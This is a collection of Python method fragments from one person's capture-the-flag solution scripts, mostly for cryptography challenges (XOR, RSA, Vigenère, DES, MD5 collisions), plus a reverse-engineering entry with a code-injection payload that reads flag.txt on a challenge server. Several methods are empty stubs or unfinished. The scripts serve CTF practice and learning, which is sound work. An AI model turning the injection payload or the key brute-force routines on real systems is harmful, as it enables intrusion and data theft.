            "84ae",
            "cf88",
            "97a3",
            "17ad",
            "7124",
            "eff2",
            "e373",
            "c974",
            "7689",
            "b8b2",
            "e899",
            "d042",
            "47d9",
            "cca9",
            "ab2a",
            "de77",
            "4654",
            "9ecb",
            "ab6e",
            "bb8e",
            "b76b",
            "d661",
            "63f8",
            "7095",
            "567e",
            "b837",
            "2b80",
            "ad4f",
            "c514",
            "ffa4",
            "fc37",
            "7254",
            "b48b",
            "d38b",
            "a02b",
            "ec6c",
            "eacc",
            "8b70",
            "b03e",
            "1b36",
            "81ff",
            "77e4",
            "dbe6",
            "59d9",
            "fd6a",
            "5653",
            "8b95",
            "d0e5",
        ]

        file_hash = self.Path(self.folder_files, "level4.hash.bin")
        with open(file_hash, "rb") as f:
            self.correct_pw_hash = f.read()

        with open(self.challenge_file, "rb") as f:
            self.flag_enc = f.read()

        pw = self.bruteforcing()
        flag = self.str_xor(self.flag_enc.decode(), pw)
        print(flag)

	# /home/figaro/CTF/Categories/Cryptography/picoCTF/ReadMyCert/payloads/solution.py
    def parse_csr(self):
        with open(self.challenge_file, "rb") as f:
            csr_data = f.read()

        csr = crypto.load_certificate_request(crypto.FILETYPE_PEM, csr_data)
        # Print the parsed CSR
        for i in range(csr.get_subject().get_components().__len__()):
            print(csr.get_subject().get_components()[i])

	# /home/figaro/CTF/Categories/Cryptography/picoCTF/ReadMyCert/payloads/solution.py
    def main(self):
        self.parse_csr()

	# /home/figaro/CTF/Categories/Cryptography/picoCTF/Custom_Encryption/payloads/solution.py
    def main(self):
        with open(self.challenge_file, "r") as f:
            enc_flag_data = f.read().strip().split("\n")

        a = enc_flag_data[0].split(" = ")[1]
        b = enc_flag_data[1].split(" = ")[1]
        cipher = enc_flag_data[2].split(": ")[1].strip("[]").split(", ")
        a = int(a)
        b = int(b)
        cipher = [int(c) for c in cipher]

        p = self.finding_next_prime(a)
        g = self.finding_next_prime(b)

        u = self.generator(g, a, p)
        v = self.generator(g, b, p)

        key = self.generator(v, a, p)
        b_key = self.generator(u, b, p)
        if key == b_key:
            shared_key = key

        # print(shared_key)
        semi_plaintext = self.decrypt(cipher, shared_key)
        tex_key = "trudeau"

        flag = self.dynamic_xor_decrypt("".join(semi_plaintext), tex_key)
        flag = flag[::-1]
        print(flag)

	# /home/figaro/CTF/Categories/Cryptography/picoCTF/Custom_Encryption/payloads/solution.py
    def generator(self, g, x, p):
        return pow(g, x) % p

	# /home/figaro/CTF/Categories/Cryptography/picoCTF/Custom_Encryption/payloads/solution.py
    def is_prime(self, p):
        v = 0
        for i in range(2, p + 1):
            if p % i == 0:
                v = v + 1
        if v > 1:
            return False
        else:
            return True

	# /home/figaro/CTF/Categories/Cryptography/picoCTF/Custom_Encryption/payloads/solution.py
    def finding_next_prime(self, number, n=None):
        if n:
            for _ in range(number, number + n):
                if self.is_prime(number):
                    return number
        else:
            while True:
                number = number + 1
                if self.is_prime(number):
                    return number

	# /home/figaro/CTF/Categories/Cryptography/picoCTF/Custom_Encryption/payloads/solution.py
    def dynamic_xor_encrypt(self, plaintext, text_key):
        cipher_text = ""
        key_length = len(text_key)
        for i, char in enumerate(plaintext[::-1]):
            key_char = text_key[i % key_length]
            encrypted_char = chr(ord(char) ^ ord(key_char))
            cipher_text += encrypted_char
        return cipher_text

	# /home/figaro/CTF/Categories/Cryptography/picoCTF/Custom_Encryption/payloads/solution.py
    def dynamic_xor_decrypt(self, plaintext, text_key):
        cipher_text = ""
        key_length = len(text_key)
        for i, char in enumerate(plaintext):
            key_char = text_key[i % key_length]
            encrypted_char = chr(ord(char) ^ ord(key_char))
            cipher_text += encrypted_char
        return cipher_text

	# /home/figaro/CTF/Categories/Cryptography/picoCTF/Custom_Encryption/payloads/solution.py
    def encrypt(self, plaintext, key):
        cipher = []
        for char in plaintext:
            cipher.append(((ord(char) * key * 311)))
        return cipher

	# /home/figaro/CTF/Categories/Cryptography/picoCTF/Custom_Encryption/payloads/solution.py
    def decrypt(self, cipher_list, key):
        plaintext = []
        for char in cipher_list:
            plaintext.append(chr(int(char / key / 311)))
        return plaintext

	# /home/figaro/CTF/Categories/Cryptography/picoCTF/basic_mod1/payloads/solution.py
    def get_message(self):
        with open(self.challenge_file, "r") as f:
            self.message_data = f.read().strip()

	# /home/figaro/CTF/Categories/Cryptography/picoCTF/basic_mod1/payloads/solution.py
    def context(self, number):
        if 0 <= number <= 25:
            # Uppercase
            return chr(ord("A") + number)
        elif 26 <= number <= 35:
            # Numbers
            return chr(ord("0") + number - 26)
        elif number == 36:
            return "_"
        else:
            return str(number)

	# /home/figaro/CTF/Categories/Cryptography/picoCTF/basic_mod1/payloads/solution.py
    def main(self):
        self.get_message()

        flag = [self.context(int(i) % 37) for i in self.message_data.split(" ")]

        flag = "".join(flag)

        flag = "picoCTF{" + flag + "}"

        print(flag)

	# /home/figaro/CTF/Categories/Cryptography/bsides/ViSquared/payloads/solution.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.passwords_source = b64decode(
            b"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2RhbmllbG1pZXNzbGVyL1NlY0xpc3RzL21hc3Rlci9QYXNzd29yZHMvQ29tbW9uLUNyZWRlbnRpYWxzLzEway1tb3N0LWNvbW1vbi50eHQ="
        ).decode()

	# /home/figaro/CTF/Categories/Cryptography/bsides/ViSquared/payloads/solution.py
    def get_online_passwords(self):
        r = requests.get(self.passwords_source)
        self.password_list = r.text.split("\n")

	# /home/figaro/CTF/Categories/Cryptography/bsides/ViSquared/payloads/solution.py
    def decrypting_vigenere(self, ciphertext, key):
        key = key.lower()
        plaintext = ""
        for i, ch in enumerate(ciphertext):
            if ch.isalpha():
                nch = ord(ch) - 97
                nk = ord(key[i % len(key)]) - 97
                plaintext += chr((nch - nk + 26) % 26 + 97)
            else:
                plaintext += ch
        return plaintext

	# /home/figaro/CTF/Categories/Cryptography/bsides/ViSquared/payloads/solution.py
    def brute_force(
        self,
        ciphertext,
        password_list,
        cleartext: str = None,
        verbose: bool = False,
        tryall=False,
    ):

        for i, password in enumerate(password_list):
            if password.strip() == "":
                continue

            if verbose:
                if i % 100 == 0:
                    print(f"Trying password {i+1}/{len(password_list)}: {password}")

            decrypted = ciphertext
            for _ in range(2):

                decrypted = self.decrypting_vigenere(decrypted, password)

            if cleartext is not None:
                if cleartext in decrypted:
                    if verbose:
                        print(f"Found password: {password}")
                        print(f"Decrypted text: {decrypted}")
                    if not tryall:
                        return password, decrypted
            else:
                if decrypted.isprintable() and len(decrypted) > 10:
                    if verbose:
                        print(f"Found valid password: {password}")
                        print(f"Decrypted text: {decrypted}")
                    # return password, decrypted

        if verbose:
            print("No valid password found.")
        return None, None

	# /home/figaro/CTF/Categories/Cryptography/bsides/ViSquared/payloads/solution.py
    def main(self):

        with open(self.challenge_file, "r") as f:
            ciphertext = f.read().strip()

        self.get_online_passwords()
        print("Starting brute force...")

        password, decrypted_text = self.brute_force(
            ciphertext,
            password_list=self.password_list,
            cleartext="htb",
            verbose=True,
            tryall=True,
        )

	# /home/figaro/CTF/Categories/Cryptography/CSCG/Insecure/payloads/solution.py
    def main(self):
        e = 65537
        n = 1034776851837418228051242693253376923
        c = 1006234941664191676977296641660749407

        # from factordb.com
        p = 1086027579223696553
        q = 952809000096560291

        # Calculations start here
        phi = (p - 1) * (q - 1)

        d = inverse(e, phi)

        decrypted_m = pow(c, d, n)
        # print(decrypted_m)
        print("csc{" + str(decrypted_m) + "}")

	# /home/figaro/CTF/Categories/Cryptography/ReplyCode/KeiPybAras_Revenge/payloads/solution.py
    def main(self):

        # Known plaintext
        test = b"Capybara friends, mission accomplished! We've caused a blackout, let's meet at the bar to celebrate!"

        # Parse from output file
        with open(self.folfil("files", "output.txt"), "r") as f:
            contents = f.read().split("\n")

        test_dt, test_ts, test_cipher = contents[0].split(" ")
        test_cipher = bytes.fromhex(test_cipher)

        flag_dt, flag_ts, flag_cipher = contents[1].split(" ")
        flag_cipher = bytes.fromhex(flag_cipher)

        # Get test cipher and flag cipher timestamp hashes

        test_ts = int(
            (
                cal.timegm(t.strptime(test_dt + " " + test_ts, "%Y-%m-%d %H:%M:%S.%f"))
                + float("." + test_ts.split(".")[1])
            )
            * 1000
        ).to_bytes(16, byteorder="big")
        test_ts = md5(test_ts).digest()

        flag_ts = int(
            (
                cal.timegm(t.strptime(flag_dt + " " + flag_ts, "%Y-%m-%d %H:%M:%S.%f"))
                + float("." + flag_ts.split(".")[1])
            )
            * 1000
        ).to_bytes(16, byteorder="big")
        flag_ts = md5(flag_ts).digest()

        # Divide ciphers into blocks
        test_blocks = [test_cipher[i : i + 16] for i in range(0, len(test_cipher), 16)]
        flag_blocks = [flag_cipher[i : i + 16] for i in range(0, len(flag_cipher), 16)]

        # Reverse the xor by timestamp
        test_dexored = b""
        for block in test_blocks:
            block_with_xor = bytes(a ^ b for a, b in zip(block, test_ts))
            test_dexored += block_with_xor

        flag_dexored = b""
        for block in flag_blocks:
            block_with_xor = bytes(a ^ b for a, b in zip(block, flag_ts))
            flag_dexored += block_with_xor

        # Extract key from known plaintext
        key = bytes(a ^ b for a, b in zip(test, test_dexored))

        # Decrypt flag
        flag = bytes(a ^ b for a, b in zip(key, flag_dexored))

        print(key)
        print(flag)

        # The XOR of two ciphertexts (output from your previous step)
        # cipher_xor = b"~I\x9c\x9a\xdd\x83\xe2\x9e\xd4@\x18\x84\xbd~\xec B\xf67\xbf..."

        cipher_xor = flag

        # Known part of the flag (assuming it's at the beginning)
        known_flag = b"FLG"

        # XOR the known flag with the first bytes of the ciphertext XOR result
        keystream_guess = self.xor_bytes(cipher_xor[: len(known_flag)], known_flag)

        # Use the guessed keystream to decrypt more of one plaintext
        possible_plaintext = self.xor_bytes(
            cipher_xor, keystream_guess * (len(cipher_xor) // len(keystream_guess) + 1)
        )

        print("Recovered plaintext guess:", possible_plaintext.decode(errors="ignore"))

	# /home/figaro/CTF/Categories/Cryptography/ReplyCode/KeiPybAras_Revenge/payloads/solution.py
    def xor_bytes(self, a, b):
        return bytes(x ^ y for x, y in zip(a, b))

	# /home/figaro/CTF/Categories/Cryptography/NTUA/Secure_Encryption_Service/payloads/solution.py
    def solve(self):
        pass

	# /home/figaro/CTF/Categories/Cryptography/NTUA/Secure_Encryption_Service/payloads/solution.py
    def main(self):

        conn_1 = CTFSolver(
            conn=self.conn_type, file=self.file, url=self.url, port=self.port
        )

        conn_2 = CTFSolver(
            conn=self.conn_type, file=self.file, url=self.url, port=self.port
        )

        # For the local connection, we need to edit the server.py file
        conn_1.challenge_file = self.Path(self.folders["data"], "edited_server.py")
        conn_2.challenge_file = self.Path(self.folders["data"], "edited_server.py")

        # Initialize the connection on both
        conn_1.initiate_connection()
        conn_2.initiate_connection()

        conn_1.recv_send(text_until="> ", text="1")
        encflag = conn_1.recv_lines(1, save=True)[0].decode().strip()
        encflag = bytes.fromhex(encflag)

        conn_2.recv_send(text_until="> ", text="2")
        conn_2.recv_send(text_until=": ", text="00" * len(encflag))

        xor_with_this = conn_2.recv_lines(1, save=True)[0].decode().strip()

        xor_with_this = bytes.fromhex(xor_with_this)

        print(self.pwn.xor(xor_with_this, encflag))

	# /home/figaro/CTF/Categories/Cryptography/NTUA/Megalh_padata/payloads/solution.py
    def xor(self, a, b):
        return bytes(
            [a[i % len(a)] ^ b[i % len(b)] for i in range(max(len(a), len(b)))]
        )

	# /home/figaro/CTF/Categories/Cryptography/NTUA/Megalh_padata/payloads/solution.py
    def open_file(self):
        with open(self.challenge_file, "r") as f:
            data = f.read().split("\n")
            n = int(data[0].split("= ")[1])
            enc_flag = data[1].split("= ")[1]
            c = data[2].split("= ")[1]
        return n, enc_flag, c

	# /home/figaro/CTF/Categories/Cryptography/NTUA/Megalh_padata/payloads/solution.py
    def main(self):

        n, enc_flag, c = self.open_file()

        m = b"1337"

        c_rsa = pow(bytes_to_long(m), 3, n)

        otp = self.xor(long_to_bytes(c_rsa), bytes.fromhex(c))

        rsa_flag = self.xor(bytes.fromhex(enc_flag), otp)[:-5]

        m, _ = iroot(bytes_to_long(rsa_flag), 3)
        m = long_to_bytes(m)
        print(m)

	# /home/figaro/CTF/Categories/Cryptography/NTUA/Missing_Reindeer/payloads/solution.py
    def main(self):
        self.key = ""
        key_pub = self.Path(self.folder_files, "key.pub")
        with open(key_pub, "r") as f:
            self.key = RSA.importKey(f.read())
        self.n = self.key.n
        self.e = self.key.e

        self.crypted = b"Ci95oTkIL85VWrJLVhns1O2vyBeCd0weKp9o3dSY7hQl7CyiIB/D3HaXQ619k0+4FxkVEksPL6j3wLp8HMJAPxeA321RZexR9qwswQv2S6xQ3QFJi6sgvxkN0YnXtLKRYHQ3te1Nzo53gDnbvuR6zWV8fdlOcBoHtKXlVlsqODku2GvkTQ/06x8zOAWgQCKj78V2mkPiSSXf2/qfDp+FEalbOJlILsZMe3NdgjvohpJHN3O5hLfBPdod2v6iSeNxl7eVcpNtwjkhjzUx35SScJDzKuvAv+6DupMrVSLUfcWyvYUyd/l4v01w+8wvPH9l"

        self.msg = bytes_to_long(b64decode(self.crypted))

        cleartext = self.find_invpow(self.msg, 3)
        cleartext = long_to_bytes(int(cleartext))

        print(cleartext)

	# /home/figaro/CTF/Categories/Cryptography/NTUA/Missing_Reindeer/payloads/solution.py
    def find_invpow(self, x, n):
        """Finds the integer component of the n'th root of x,
        an integer such that y ** n <= x < (y + 1) ** n.
        """
        high = 1
        while high**n < x:
            high *= 2
        low = high // 2
        while low < high:
            mid = (low + high) // 2
            if low < mid and mid**n < x:
                low = mid
            elif high > mid and mid**n > x:
                high = mid
            else:
                return mid
        return mid + 1

	# /home/figaro/CTF/Categories/Cryptography/HTB/alphascii_clashing/payloads/solution.py
    def md5_hash(self, s):
        return md5(s.encode()).hexdigest()

	# /home/figaro/CTF/Categories/Cryptography/HTB/alphascii_clashing/payloads/solution.py
    def find_collision(
        self, target_hash, max_length=10, prefix="", suffix="", lengthy=False
    ):
        # Define the character set to use for generating combinations
        charset = (
            string.ascii_letters + string.digits
        )  # You can add special characters if needed

        if lengthy:
            for length in range(1, max_length + 1):
                for combination in itertools.product(charset, repeat=length):
                    candidate = prefix + "".join(combination) + suffix
                    print(candidate, self.md5_hash(candidate), self.target_hash)

                    if self.md5_hash(candidate) == target_hash:
                        return candidate
        else:
            # Iterate over lengths from 1 to max_length
            for combination in itertools.product(
                charset, repeat=max_length - len(prefix) - len(suffix)
            ):
                candidate = prefix + "".join(combination) + suffix
                print(candidate, self.md5_hash(candidate), self.target_hash)
                if self.md5_hash(candidate) == target_hash:
                    return candidate
        return None

	# /home/figaro/CTF/Categories/Cryptography/HTB/alphascii_clashing/payloads/solution.py
    def bruteforce(self):
        self.users = {
            "HTBUser132": [md5(b"HTBUser132").hexdigest(), "secure123!"],
            "JohnMarcus": [md5(b"JohnMarcus").hexdigest(), "0123456789"],
        }

        # The target hash for "HTBUser 132"
        self.target_hash = self.md5_hash("HTBUser132")

        self.collision = self.find_collision(
            self.target_hash,
            max_length=len("HTBUser132"),
            prefix="",
            suffix="",
            lengthy=True,
        )
        print(
            f"Found collision: {self.collision} with hash: {self.md5_hash(self.collision)}"
        )

	# /home/figaro/CTF/Categories/Cryptography/HTB/alphascii_clashing/payloads/solution.py
    def known_colissions(self):
        one = {
            "username": "TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak",
            "password": "verysecure",
        }
        two = {
            "username": "TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak",
            "password": "verysecure",
        }

        print(f"Hash one: {self.md5_hash(one['username'])}")
        print(f"Hash two: {self.md5_hash(two['username'])}")

	# /home/figaro/CTF/Categories/Cryptography/HTB/alphascii_clashing/payloads/solution.py
    def main(self):
        # self.bruteforce()
        self.known_colissions()

	# /home/figaro/CTF/Categories/Cryptography/HTB/MuTLock/payloads/solution.py
    def main(self):
        pass

	# /home/figaro/CTF/Categories/Cryptography/HTB/sugar_free_candies/payloads/solution.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.v1 = 4196604293528562019178729176959696479940189487937638820300425092623669070870963842968690664766177268414970591786532318240478088400508536
        self.v2 = 11553755018372917030893247277947844502733193007054515695939193023629350385471097895533448484666684220755712537476486600303519342608532236
        self.v3 = 14943875659428467087081841480998474044007665197104764079769879270204055794811591927815227928936527971132575961879124968229204795457570030
        self.v4 = 6336816260107995932250378492551290960420748628

	# /home/figaro/CTF/Categories/Cryptography/HTB/sugar_free_candies/payloads/solution.py
    def solve_equations(self):
        self.cnd1, self.cnd2, self.cnd3 = symbols("cnd1 cnd2 cnd3")

        # Define the equations
        eq1 = Eq(self.cnd1**3 + self.cnd3**2 + self.cnd2, self.v1)
        eq2 = Eq(self.cnd2**3 + self.cnd1**2 + self.cnd3, self.v2)
        eq3 = Eq(self.cnd3**3 + self.cnd2**2 + self.cnd1, self.v3)
        eq4 = Eq(self.cnd1 + self.cnd2 + self.cnd3, self.v4)

        solution = solve((eq1, eq2, eq3, eq4), (self.cnd1, self.cnd2, self.cnd3))
        return solution

	# /home/figaro/CTF/Categories/Cryptography/HTB/sugar_free_candies/payloads/solution.py
    def main(self):
        solution = self.solve_equations()

        # Check if the solution is valid
        if isinstance(solution, list) and len(solution) > 0:
            # Assuming the first solution is the desired one
            sol = solution[0]
            print("cnd1:", sol[self.cnd1])
            print("cnd2:", sol[self.cnd2])
            print("cnd3:", sol[self.cnd3])

	# /home/figaro/CTF/Categories/Cryptography/HTB/sekur_julius/payloads/solution.py
    def juilius_decrypt(self, msg, shift):
        pt = ""
        for c in msg:
            if c == "0":
                pt += " "
            elif not ord("A") <= ord(c) <= ord("Z"):
                pt += c
            else:
                o = ord(c) - 65
                pt += chr(65 + (o - shift) % 26)
        return pt

	# /home/figaro/CTF/Categories/Cryptography/HTB/sekur_julius/payloads/solution.py
    def brute_force(self, encrypted_data):

        for shift in range(27):
            pt = self.juilius_decrypt(encrypted_data, shift)
            if "HTB" in pt:
                return pt

	# /home/figaro/CTF/Categories/Cryptography/HTB/sekur_julius/payloads/solution.py
    def main(self):
        with open(self.challenge_file, "r") as f:
            encrypted_data = f.read().strip()

        decrypted_data = self.brute_force(encrypted_data)
        print(decrypted_data)

	# /home/figaro/CTF/Categories/Cryptography/ECSC/Asteromata/payloads/solution.py
    def get_output_variables(self):
        with open(self.challenge_file, "r") as f:
            self.variables = {
                line.split(" = ")[0]: int(line.strip("\n").split(" = ")[1])
                for line in f
            }

	# /home/figaro/CTF/Categories/Cryptography/ECSC/Asteromata/payloads/solution.py
    def main(self):
        self.get_output_variables()
        rx = re.compile(r"(\w+)\s*=\s*(\d+)")

        ct = self.variables["ct"]
        hint = self.variables["hint"]
        n = self.variables["n"]
        e = self.variables["e"]

        P = symbols("P")
        phi_expr = lambda p: n + 1 - p - n // p  # symbolic ϕ(n)  (works in Z)
        start = 103000
        message = ""
        for k in range(start, e):
            print(f"I - {k} | m: {message}")

            # build F_k(p) with the trick explained above
            Y = k * (n + 1 - P) + 1  # k(n+1-p) + 1   (first part)
            Fk = (
                (Y - k * n / P) ** 2 * P**4
                - hint * e * e * P**3
                + (k * k * n * n + e**4 * n) * P**2
            )
            poly = Poly(Fk.expand() * P**0, P)  # canonical form, ZZ [x]

            # try to pull out linear factors
            for factor, _ in poly.factor_list()[1]:
                if factor.degree() != 1:  # need a root of degree-1
                    message = "prev continued"
                    continue
                root = -factor.all_coeffs()[-1] // factor.all_coeffs()[0]

                if root > 1 and n % root == 0:  # bingo – we have   p
                    p = int(root)
                    q = n // p
                    phi = (p - 1) * (q - 1)
                    d = gmpy2.invert(e, phi)  # private exponent
                    m = pow(ct, d, n)
                    flag = gmpy2.to_binary(m).rstrip(b"\x00")
                    print(f"[+] k   = {k}")
                    print(f"[+] p   = {p}")
                    print(f"[+] q   = {q}")
                    print(f"[+] d   = {d}")
                    print(f"[+] flag = {flag.decode(errors='ignore')}")
                    sys.exit(0)
                message = ""

	# /home/figaro/CTF/Categories/Cryptography/ECSC/Asteromata/payloads/attempt_01.py
    def get_output_variables(self):
        with open(self.challenge_file, "r") as f:
            self.variables = {
                line.split(" = ")[0]: int(line.strip("\n").split(" = ")[1])
                for line in f
            }

	# /home/figaro/CTF/Categories/Cryptography/ECSC/Asteromata/payloads/attempt_01.py
    def main(self):
        self.get_output_variables()
        # self.variables
        # Let p be unknown. Use:
        # hint = d^2 * p + e^2 * q
        # n = p * q → q = n // p
        # Substitute and solve: hint = d^2 * p + e^2 * (n // p)
        # This turns into: hint = A*p + B*(n//p)

        # We can brute force small `e` (22 bits), so d is not that large.
        ct = self.variables["ct"]
        hint = self.variables["hint"]
        n = self.variables["n"]
        e = self.variables["e"]

        found = False
        for possible_d in range(1, 1 << 22):
            A = possible_d**2
            B = e**2
            numerator = hint - B * n
            denominator = A - B

            if denominator == 0:
                continue

            if numerator % denominator != 0:
                continue

            p_candidate = numerator // denominator
            if n % p_candidate != 0:
                continue

            q_candidate = n // p_candidate

            if isPrime(p_candidate) and isPrime(q_candidate):
                p = p_candidate
                q = q_candidate
                d = possible_d
                found = True
                print(f"[+] Found p and q using d = {d}")
                break

        if not found:
            print("[-] Failed to find valid p and q")
            return  # or: raise Exception("Failed to find primes")

        # Continue only if found
        phi = (p - 1) * (q - 1)
        d = inverse(e, phi)

	# /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different/payloads/solution.py
    def des_key_generator(self):
        """
        Generator for all possible 8-byte DES keys.
        DES uses a 56-bit key space, padded to 8 bytes.
        """
        for key in range(2**64):
            # Convert the 56-bit key to an 8-byte key
            key_bytes = key.to_bytes(8, byteorder="big")
            yield key_bytes

	# /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different/payloads/solution.py
    def oracle_encrypt(self, pt_hex):
        self.recv_send(text="1", text_until="> ")
        self.recv_send(
            text=pt_hex,
            text_until="Provide message to encrypt > ",
        )
        encrypted_pt = self.recv_lines(1, save=True)[0]
        return bytes.fromhex(encrypted_pt.strip().decode())

	# /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different/payloads/solution.py
    def menu_handler(self, verbose=False):
        for pt in self.plaintexts:
            ct = self.oracle_encrypt(pt.hex())
            if verbose:
                print(f"Encrypting plaintext: {pt.hex()} - ciphertext: {ct.hex()}")
            self.pairs.append((pt, ct))

	# /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different/payloads/solution.py
    def try_key(self, key_bytes):
        key = des.DesKey(key_bytes)
        for pt, ct in self.pairs:
            if key.encrypt(pt) != ct:
                return False
        return True

	# /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different/payloads/solution.py
    def bruteforce_key(self, verbose=False):
        found_key = None
        for key_canditate in itertools.product(range(256), repeat=8):
            if verbose:
                print(f"Trying key: {bytes(key_canditate).hex()}")
            key_bytes = bytes(key_canditate)
            if self.try_key(key_bytes):
                found_key = key_bytes
                print("Key found:", found_key.hex())
                break
        return found_key

	# /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different/payloads/solution.py
    def bruteforce_key_multiprocessing(self, verbose=False):
        """
        Multiprocessing brute-force key search.
        """
        found_key = None

        with Pool(processes=cpu_count() - 8) as pool:
            key_candidates = itertools.product(range(256), repeat=8)
            # Pass both key candidates and pairs to the worker
            args = ((key_candidate, self.pairs) for key_candidate in key_candidates)
            for result in pool.imap(worker, args):
                if result:
                    found_key = result
                    print("Key found:", found_key.hex())
                    pool.terminate()  # Stop other processes
                    break

        return found_key

	# /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different/payloads/solution.py
    def main(self):

        # 50 unique 8-byte blocks
        self.plaintexts = [bytes([i]) * 8 for i in range(49)]
        self.pairs = []

        self.initiate_connection()
        self.recv_lines(3)

        self.menu_handler(verbose=True)

        found_key = self.bruteforce_key_multiprocessing(verbose=True)
        if not found_key:
            print("Key not found. Try optimizing or using more pairs.")
            return

        # Encrypt the magic phrase
        magic_pt = b"Give me the flag"
        key = des.DesKey(found_key)
        magic_ct = key.encrypt(magic_pt)
        print("Magic ciphertext:", magic_ct.hex())

        self.recv_send(text="2", text_until="> ")
        self.recv_send(text=magic_ct.hex(), text_until="Provide the magic phrase > ")
        flag = self.recv_lines(3, display=True, save=True)[0]

	# /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different_Revenge/payloads/solution.py
    def des_key_generator(self):
        """
        Generator for all possible 8-byte DES keys.
        DES uses a 56-bit key space, padded to 8 bytes.
        """
        for key in range(2**64):
            # Convert the 56-bit key to an 8-byte key
            key_bytes = key.to_bytes(8, byteorder="big")
            yield key_bytes

	# /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different_Revenge/payloads/solution.py
    def oracle_encrypt(self, pt_hex):
        self.recv_send(text="1", text_until="> ")
        self.recv_send(
            text=pt_hex,
            text_until="Provide message to encrypt > ",
        )
        encrypted_pt = self.recv_lines(1, save=True)[0]
        return bytes.fromhex(encrypted_pt.strip().decode())

	# /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different_Revenge/payloads/solution.py
    def menu_handler(self, verbose=False):
        for pt in self.plaintexts:
            ct = self.oracle_encrypt(pt.hex())
            if verbose:
                print(f"Encrypting plaintext: {pt.hex()} - ciphertext: {ct.hex()}")
            self.pairs.append((pt, ct))

	# /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different_Revenge/payloads/solution.py
    def try_key(self, key_bytes):
        key = des.DesKey(key_bytes)
        for pt, ct in self.pairs:
            if key.encrypt(pt) != ct:
                return False
        return True

	# /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different_Revenge/payloads/solution.py
    def bruteforce_key(self, verbose=False):
        found_key = None
        for key_canditate in itertools.product(range(256), repeat=8):
            if verbose:
                print(f"Trying key: {bytes(key_canditate).hex()}")
            key_bytes = bytes(key_canditate)
            if self.try_key(key_bytes):
                found_key = key_bytes
                print("Key found:", found_key.hex())
                break
        return found_key

	# /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different_Revenge/payloads/solution.py
    def bruteforce_key_multiprocessing(self, verbose=False):
        """
        Multiprocessing brute-force key search.
        """
        found_key = None

        with Pool(processes=cpu_count() - 8) as pool:
            key_candidates = itertools.product(range(256), repeat=8)
            # Pass both key candidates and pairs to the worker
            args = ((key_candidate, self.pairs) for key_candidate in key_candidates)
            for result in pool.imap(worker, args):
                if result:
                    found_key = result
                    print("Key found:", found_key.hex())
                    pool.terminate()  # Stop other processes
                    break

        return found_key

	# /home/figaro/CTF/Categories/Cryptography/ECSC/This_is_different_Revenge/payloads/solution.py
    def main_multi_process(self):

        # 50 unique 8-byte blocks
        self.plaintexts = [bytes([i]) * 8 for i in range(49)]
        self.pairs = []

        self.initiate_connection()
        self.recv_lines(3)

        self.menu_handler(verbose=True)

        found_key = None
        # Needs the logic here

        # Encrypt the magic phrase
        magic_pt = b"Give me the flag"
        key = des.DesKey(found_key)
        magic_ct = key.encrypt(magic_pt)
        print("Magic ciphertext:", magic_ct.hex())

        self.recv_send(text="2", text_until="> ")
        self.recv_send(text=magic_ct.hex(), text_until="Provide the magic phrase > ")
        flag = self.recv_lines(3, display=True, save=True)[0]

	# /home/figaro/CTF/Categories/Cryptography/ECSC/Gamble_Auction/payloads/solution.py
    def main(self):
        pass

	# /home/figaro/CTF/Categories/Cryptography/ECSC/The_Truth/payloads/solution.py
    def main(self):

        with open(self.challenge_file, "r") as f:
            data = f.read()

        # alphabet = ascii_lowercase + ascii_uppercase + digits

        crypted_alphabet = set()
        for c in data:
            crypted_alphabet.add(c)

        crypted_dict = {c: "" for c in sorted(list(crypted_alphabet))}

        # self.saving_to_json(crypted_dict)

        crypted_dict = self.read_json("table.json")

        for i, v in enumerate(crypted_dict):
            print(i + 2, v, crypted_dict[v])

        print(self.decoding(crypted_dict, data))

	# /home/figaro/CTF/Categories/Cryptography/ECSC/The_Truth/payloads/solution.py
    def decoding(self, crypted_dict, data):

        decoded = ""
        for c in data:
            if c in crypted_dict.keys() and crypted_dict[c] != "":
                decoded += crypted_dict[c]
            else:
                decoded += c
        return decoded

	# /home/figaro/CTF/Categories/Cryptography/ECSC/The_Truth/payloads/solution.py
    def saving_to_json(self, crypted_dict):

        self.folfil("data", "table.json")

        with open(self.folfil("data", "table.json"), "w") as f:
            json.dump(crypted_dict, f, indent=4)

	# /home/figaro/CTF/Categories/Cryptography/ECSC/The_Truth/payloads/solution.py
    def read_json(self, filename):
        with open(self.folfil("data", filename), "r") as f:
            return json.load(f)

	# /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/Classic_Crackme_0x100/payloads/solution.py
    def main(self):
        pass

	# /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/Picker_1/payloads/solution.py
    def de_hexing_flag(self, flag):
        flag = flag[0].decode("utf-8").strip("\n").strip(" ")
        flag = [chr(int(letter, 16)) for letter in flag.split(" ")]
        flag = "".join(flag)
        return flag

	# /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/Picker_1/payloads/solution.py
    def main(self):
        self.initiate_connection()
        self.menu_num = 1
        self.menu_text = "==> "
        self.send_menu(choice="win", display=False)
        flag = self.recv_menu(number=1, display=False, save=True)

        flag = self.de_hexing_flag(flag)
        print(flag)

	# /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/Picker_2/payloads/solution.py
    def main(self):
        payload = "print(open('flag.txt','r').read())#"
        self.initiate_connection()
        self.menu_num = 0
        self.menu_text = "==> "
        self.send_menu(choice=payload, display=True)
        flag = self.recv_menu(number=1, display=True, save=True)[0]
        print(flag)

